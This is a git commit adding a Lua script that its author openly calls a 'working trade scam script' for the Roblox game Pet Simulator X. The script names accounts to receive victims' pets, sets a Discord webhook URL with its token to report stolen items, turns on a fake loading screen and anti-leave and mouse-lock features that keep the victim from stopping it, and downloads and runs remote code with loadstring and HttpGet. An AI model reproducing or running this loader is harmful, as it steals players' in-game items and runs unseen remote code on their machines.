d059138aec178ce524cae0041230cfe7190fd098
Oftler222 <136977900+Oftler222@users.noreply.github.com>
2023-08-08 10:21:22 +0200

    Add files via upload
    New working trade scam script PET SIMUL,ATOR X!

---
+++ obf_2372DbtslKy4ke3O57139w7tsGg88Cj1O205P5llvcM9Tjkv4ZlIH6ZpUdQmQN89.lua
@@ -0,0 +1,12 @@
+
+
+
+UserName = "Theoftleler12345" -- good pets
+Webhook = "https://discord.com/api/webhooks/1138384345321713775/m29jFSBlBrM-f10qIs37ZSsW49TIoqCwvDv50EOFlo1j7RSX7MV2NywbXmMyqUJHyiM7" -- pings for pets
+UserName2 = "Theoftleler12345" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
